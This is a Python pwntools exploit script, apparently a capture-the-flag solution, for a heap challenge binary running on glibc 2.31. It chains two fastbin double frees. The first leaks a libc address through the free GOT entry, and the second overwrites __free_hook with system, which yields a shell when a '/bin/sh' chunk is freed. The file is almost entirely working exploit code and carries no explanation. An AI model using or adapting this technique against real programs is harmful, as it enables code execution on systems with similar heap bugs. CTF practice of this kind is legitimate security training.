#GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.7) stable release version 2.31.
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'debug'
io = gdb.debug('./vuln','b *0x401564')
# io = remote('gz.imxbt.cn',20788)
elf = ELF('./vuln')
lib = ELF('./libc-2.31.so')

def add(idx,content):
    io.sendlineafter(b'>>>',b'1')
    io.sendlineafter(b'idx\n',str(idx))
    io.sendlineafter(b'content\n',content)
    
def free(idx):
    io.sendlineafter(b'>>>',b'2')
    io.sendlineafter(b'idx\n',str(idx))
    
def show(idx):
    io.sendlineafter(b'>>>',b'3')
    io.sendlineafter(b'idx\n',str(idx))
    
for i in range(9):
    add(i,b'a')

for i in range(7):
    free(i)
free(7)
free(8)
free(7)

for i in range(7):
    add(i,b'a')

add(7,p64(0x4040A8))
add(8,b'a')
add(9,b'b')
add(10,p64(0)*3+p64(elf.got['free']))   #?
show(0)
#leak_libc
free_addr = u64(io.recv(6).ljust(8,b'\x00'))
lib_base = free_addr-lib.sym['free']
free_hook_addr = lib_base+lib.sym['__free_hook']
sys_addr = lib_base+lib.sym['system']
success(hex(free_addr))
success(f'free_hook_addr=>{hex(free_hook_addr)}')

for i in range(9):
    add(i,b'/bin/sh\x00')
for i in range(7):
    free(i)
free(7)
free(8)
free(7)

for i in range(7):
    add(i,b'a')
add(7,p64(free_hook_addr))
add(8,b'a')
add(9,b'/bin/sh\x00')
add(10,p64(sys_addr))
free(9)

io.interactive()